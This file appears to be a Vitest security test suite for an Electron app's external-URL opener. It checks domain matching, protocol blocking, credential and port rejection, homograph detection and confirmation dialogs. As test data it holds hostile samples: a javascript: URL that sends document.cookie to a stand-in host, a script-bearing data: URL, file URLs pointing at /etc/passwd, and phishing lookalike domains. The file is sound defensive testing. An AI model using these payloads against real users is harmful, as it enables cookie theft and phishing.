/*
 * Urban Flow - Adaptive Traffic Signal System
 * Copyright (c) 2026 Harsh Aggarwal <aggarwalharsh663@gmail.com>. All rights reserved.
 *
 * Original Author & Sole Intellectual Property Owner: Harsh Aggarwal
 * Any additions, modifications, or contributed files to this project automatically
 * and irrevocably vest all copyright and intellectual property rights solely in Harsh Aggarwal.
 */

import { describe, it, expect, vi } from 'vitest';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);
const {
  TRUSTED_EXTERNAL_DOMAINS,
  isMatchingDomain,
  validateExternalUrl,
  openExternalUrl,
} = require('../../electron/url-utils.cjs');

describe('Navigation Security & External URL Opening Architecture', () => {
  describe('Domain and Hostname Matching Security', () => {
    it('correctly matches exact trusted domains and subdomains', () => {
      expect(isMatchingDomain('github.com', 'github.com')).toBe(true);
      expect(isMatchingDomain('docs.github.com', 'github.com')).toBe(true);
      expect(isMatchingDomain('api.github.com', 'github.com')).toBe(true);
      expect(isMatchingDomain('docs.ultralytics.com', 'ultralytics.com')).toBe(true);
      expect(isMatchingDomain('docs.opencv.org', 'opencv.org')).toBe(true);
    });

    it('prevents domain confusion attacks (fake domains, suffix tricks, deceptive subdomains)', () => {
      // Suffix attacks (must not match just because it ends with the name without a dot)
      expect(isMatchingDomain('prefixgithub.com', 'github.com')).toBe(false);
      expect(isMatchingDomain('suffixgithub.org', 'github.com')).toBe(false);
      expect(isMatchingDomain('notopencv.org', 'opencv.org')).toBe(false);

      // Inverted subdomain attacks: untrusted domain with trusted prefix
      expect(isMatchingDomain('github.com.untrusted.example', 'github.com')).toBe(false);
      expect(isMatchingDomain('ultralytics.com.untrusted.example', 'ultralytics.com')).toBe(false);
      expect(isMatchingDomain('opencv.org.untrusted.example', 'opencv.org')).toBe(false);
    });
  });

  describe('12 Core Security Test Scenarios', () => {
    // 1. Trusted HTTP URL
    it('1. Trusted HTTP URL: validates as trusted and opens without dialog confirmation', async () => {
      const url = 'http://github.com/harsh-aggarwal/Urban-Flow';
      const validation = validateExternalUrl(url);

      expect(validation.valid).toBe(true);
      expect(validation.isTrusted).toBe(true);
      expect(validation.protocol).toBe('http:');
      expect(validation.hostname).toBe('github.com');

      const mockShellOpen = vi.fn().mockResolvedValue(undefined);
      const mockDialog = vi.fn();

      const result = await openExternalUrl(url, {
        shellOpenFn: mockShellOpen,
        dialogFn: mockDialog,
      });

      expect(result.opened).toBe(true);
      expect(result.isTrusted).toBe(true);
      expect(mockShellOpen).toHaveBeenCalledWith(url);
      expect(mockDialog).not.toHaveBeenCalled();
    });

    // 2. Trusted HTTPS URL
    it('2. Trusted HTTPS URL: validates as trusted and opens without dialog confirmation', async () => {
      const url = 'https://docs.ultralytics.com/models/yolov8/';
      const validation = validateExternalUrl(url);

      expect(validation.valid).toBe(true);
      expect(validation.isTrusted).toBe(true);
      expect(validation.protocol).toBe('https:');
      expect(validation.hostname).toBe('docs.ultralytics.com');

      const mockShellOpen = vi.fn().mockResolvedValue(undefined);
      const mockDialog = vi.fn();

      const result = await openExternalUrl(url, {
        shellOpenFn: mockShellOpen,
        dialogFn: mockDialog,
      });

      expect(result.opened).toBe(true);
      expect(result.isTrusted).toBe(true);
      expect(mockShellOpen).toHaveBeenCalledWith(url);
      expect(mockDialog).not.toHaveBeenCalled();
    });

    // 3. Untrusted HTTPS URL
    it('3. Untrusted HTTPS URL: validates as untrusted and requires user confirmation', async () => {
      const url = 'https://untrusted-external-site.org/docs/page';
      const validation = validateExternalUrl(url);

      expect(validation.valid).toBe(true);
      expect(validation.isTrusted).toBe(false);
      expect(validation.hostname).toBe('untrusted-external-site.org');

      // When confirmation is requested, dialog must be invoked with destination host
      const mockShellOpen = vi.fn().mockResolvedValue(undefined);
      const mockDialog = vi.fn().mockResolvedValue({ response: 0 }); // User clicks "Open Link"

      const result = await openExternalUrl(url, {
        shellOpenFn: mockShellOpen,
        dialogFn: mockDialog,
      });

      expect(mockDialog).toHaveBeenCalledTimes(1);
      const dialogCallArgs = mockDialog.mock.calls[0];
      const dialogOpts = dialogCallArgs[0];
      expect(dialogOpts.detail).toContain('untrusted-external-site.org');
      expect(dialogOpts.detail).toContain(url);
      expect(dialogOpts.defaultId).toBe(1); // Default to Cancel
      expect(dialogOpts.cancelId).toBe(1);
      expect(result.opened).toBe(true);
      expect(result.isTrusted).toBe(false);
      expect(result.userConfirmed).toBe(true);
    });

    // 4. JavaScript URL
    it('4. JavaScript URL: rejected immediately without opening or prompting', async () => {
      const maliciousUrls = [
        'javascript:alert(document.domain)',
        'JAVASCRIPT:void(0)',
        'javascript:fetch("https://untrusted.example?c="+document.cookie)',
      ];

      for (const url of maliciousUrls) {
        const validation = validateExternalUrl(url);
        expect(validation.valid).toBe(false);
        expect(validation.reason).toMatch(/disallowed protocol/i);

        const mockShellOpen = vi.fn();
        const mockDialog = vi.fn();

        const result = await openExternalUrl(url, {
          shellOpenFn: mockShellOpen,
          dialogFn: mockDialog,
        });

        expect(result.opened).toBe(false);
        expect(mockShellOpen).not.toHaveBeenCalled();
        expect(mockDialog).not.toHaveBeenCalled();
      }
    });

    // 5. File URL
    it('5. File URL: rejected immediately to prevent local file execution or traversal', async () => {
      const fileUrls = [
        'file:///C:/Windows/System32/cmd.exe',
        'file:///etc/passwd',
        'file://localhost/c$/boot.ini',
      ];

      for (const url of fileUrls) {
        const validation = validateExternalUrl(url);
        expect(validation.valid).toBe(false);
        expect(validation.reason).toMatch(/disallowed protocol/i);

        const mockShellOpen = vi.fn();
        const mockDialog = vi.fn();

        const result = await openExternalUrl(url, {
          shellOpenFn: mockShellOpen,
          dialogFn: mockDialog,
        });

        expect(result.opened).toBe(false);
        expect(mockShellOpen).not.toHaveBeenCalled();
        expect(mockDialog).not.toHaveBeenCalled();
      }
    });

    // 6. Data URL
    it('6. Data URL: rejected immediately to prevent XSS payloads or credential harvesting', async () => {
      const dataUrls = [
        'data:text/html,<script>window.location="https://untrusted.example"</script>',
        'data:text/plain;base64,SGVsbG8sIFdvcmxkIQ==',
        'DATA:text/html;charset=utf-8,<h1>Phishing</h1>',
      ];

      for (const url of dataUrls) {
        const validation = validateExternalUrl(url);
        expect(validation.valid).toBe(false);
        expect(validation.reason).toMatch(/disallowed protocol/i);

        const mockShellOpen = vi.fn();
        const mockDialog = vi.fn();

        const result = await openExternalUrl(url, {
          shellOpenFn: mockShellOpen,
          dialogFn: mockDialog,
        });

        expect(result.opened).toBe(false);
        expect(mockShellOpen).not.toHaveBeenCalled();
        expect(mockDialog).not.toHaveBeenCalled();
      }
    });

    // 7. Malformed URL
    it('7. Malformed URL: safely handled and rejected without exceptions', async () => {
      const malformedInputs = [
        'not-a-valid-url',
        'htt://broken',
        'https://[invalid-ipv6',
        '',
        '   ',
        null as any,
        undefined as any,
        'https://example.com/test\x00nullbyte',
        'a'.repeat(3000), // Exceeds 2048 length limit
      ];

      for (const input of malformedInputs) {
        const validation = validateExternalUrl(input);
        expect(validation.valid).toBe(false);

        const mockShellOpen = vi.fn();
        const mockDialog = vi.fn();

        const result = await openExternalUrl(input, {
          shellOpenFn: mockShellOpen,
          dialogFn: mockDialog,
        });

        expect(result.opened).toBe(false);
        expect(mockShellOpen).not.toHaveBeenCalled();
        expect(mockDialog).not.toHaveBeenCalled();
      }
    });

    // 8. Lookalike trusted domain
    it('8. Lookalike trusted domain: classified as untrusted or rejected (punycode homographs)', async () => {
      // 8a. Suffix / Subdomain confusion
      const lookalikes = [
        'https://github.com.untrusted.example/phish',
        'https://prefixgithub.com/login',
        'https://opencv.org.untrusted.example/malware',
      ];

      for (const url of lookalikes) {
        const validation = validateExternalUrl(url);
        expect(validation.valid).toBe(true);
        expect(validation.isTrusted).toBe(false); // MUST NOT be treated as trusted!
      }

      // 8b. Internationalized Domain Name (IDN) / Punycode homograph attack
      // Cyrillic small letter 'і' (U+0456) instead of Latin 'i':
      const homographUrl = 'https://g\u0456thub.com/login';
      const homographValidation = validateExternalUrl(homographUrl);
      expect(homographValidation.valid).toBe(false);
      expect(homographValidation.reason).toMatch(/punycode|internationalized/i);
    });

    // 9. URL containing credentials
    it('9. URL containing credentials: rejected to prevent credential injection and phishing', async () => {
      const credentialUrls = [
        'https://admin:secret123@github.com/harsh-aggarwal/Urban-Flow',
        'https://user@opencv.org/docs',
        // Deceptive credential injection: trusted domain in userinfo, untrusted host in hostname
        'https://github.com@untrusted.example/phishing-path',
        'https://docs.ultralytics.com:password@untrusted-domain.example/',
      ];

      for (const url of credentialUrls) {
        const validation = validateExternalUrl(url);
        expect(validation.valid).toBe(false);
        expect(validation.reason).toMatch(/credentials/i);

        const mockShellOpen = vi.fn();
        const mockDialog = vi.fn();

        const result = await openExternalUrl(url, {
          shellOpenFn: mockShellOpen,
          dialogFn: mockDialog,
        });

        expect(result.opened).toBe(false);
        expect(mockShellOpen).not.toHaveBeenCalled();
        expect(mockDialog).not.toHaveBeenCalled();
      }
    });

    // 10. URL with unexpected port
    it('10. URL with unexpected port: rejected while standard ports (80/443/default) are permitted', async () => {
      // Standard ports should be accepted
      expect(validateExternalUrl('http://github.com/').valid).toBe(true);
      expect(validateExternalUrl('http://github.com:80/').valid).toBe(true);
      expect(validateExternalUrl('https://github.com/').valid).toBe(true);
      expect(validateExternalUrl('https://github.com:443/').valid).toBe(true);

      // Unexpected ports must be rejected
      const unexpectedPortUrls = [
        'https://github.com:8443/repo',
        'http://github.com:8080/repo',
        'https://example.com:22/ssh-exploit',
        'http://untrusted-site.com:3000/api',
      ];

      for (const url of unexpectedPortUrls) {
        const validation = validateExternalUrl(url);
        expect(validation.valid).toBe(false);
        expect(validation.reason).toMatch(/unexpected port/i);

        const mockShellOpen = vi.fn();
        const mockDialog = vi.fn();

        const result = await openExternalUrl(url, {
          shellOpenFn: mockShellOpen,
          dialogFn: mockDialog,
        });

        expect(result.opened).toBe(false);
        expect(mockShellOpen).not.toHaveBeenCalled();
        expect(mockDialog).not.toHaveBeenCalled();
      }
    });

    // 11. User cancelling confirmation
    it('11. User cancelling confirmation: external browser is not launched', async () => {
      const url = 'https://random-blog.net/article-about-traffic';
      const mockShellOpen = vi.fn();
      // User clicks Cancel (response: 1) or presses Escape
      const mockDialog = vi.fn().mockResolvedValue({ response: 1 });

      const result = await openExternalUrl(url, {
        shellOpenFn: mockShellOpen,
        dialogFn: mockDialog,
      });

      expect(mockDialog).toHaveBeenCalledTimes(1);
      expect(mockShellOpen).not.toHaveBeenCalled();
      expect(result.opened).toBe(false);
      expect(result.userConfirmed).toBe(false);
      expect(result.reason).toMatch(/cancelled/i);
    });

    // 12. User approving confirmation
    it('12. User approving confirmation: external browser is opened with destination URL', async () => {
      const url = 'https://news.ycombinator.com/item?id=12345';
      const mockShellOpen = vi.fn().mockResolvedValue(undefined);
      // User clicks "Open Link" (response: 0)
      const mockDialog = vi.fn().mockResolvedValue({ response: 0 });

      const result = await openExternalUrl(url, {
        shellOpenFn: mockShellOpen,
        dialogFn: mockDialog,
      });

      expect(mockDialog).toHaveBeenCalledTimes(1);
      expect(mockShellOpen).toHaveBeenCalledWith(url);
      expect(result.opened).toBe(true);
      expect(result.userConfirmed).toBe(true);
      expect(result.url).toBe(url);
    });
  });

  describe('Edge Cases and Resilience', () => {
    it('handles shell.openExternal runtime failures gracefully', async () => {
      const url = 'https://github.com/harsh-aggarwal/Urban-Flow';
      const mockShellOpen = vi.fn().mockRejectedValue(new Error('System default browser not configured'));
      const mockDialog = vi.fn();

      const result = await openExternalUrl(url, {
        shellOpenFn: mockShellOpen,
        dialogFn: mockDialog,
      });

      expect(result.opened).toBe(false);
      expect(result.error).toContain('System default browser not configured');
    });

    it('handles dialog execution failure gracefully', async () => {
      const url = 'https://external-service.org/endpoint';
      const mockShellOpen = vi.fn();
      const mockDialog = vi.fn().mockRejectedValue(new Error('Dialog creation failed'));

      const result = await openExternalUrl(url, {
        shellOpenFn: mockShellOpen,
        dialogFn: mockDialog,
      });

      expect(result.opened).toBe(false);
      expect(result.error).toContain('Dialog creation failed');
      expect(mockShellOpen).not.toHaveBeenCalled();
    });

    it('rejects custom and unexpected URI schemes (custom-app, app-launcher, unknown-scheme)', () => {
      const unexpectedSchemes = [
        'custom-scheme://test',
        'app-protocol://action/navigate',
        'unknown-handler://run',
        'desktop-helper://open',
        'internal-tool://command',
      ];

      for (const uri of unexpectedSchemes) {
        const validation = validateExternalUrl(uri);
        expect(validation.valid).toBe(false);
        expect(validation.reason).toMatch(/disallowed protocol/i);
      }
    });
  });
});
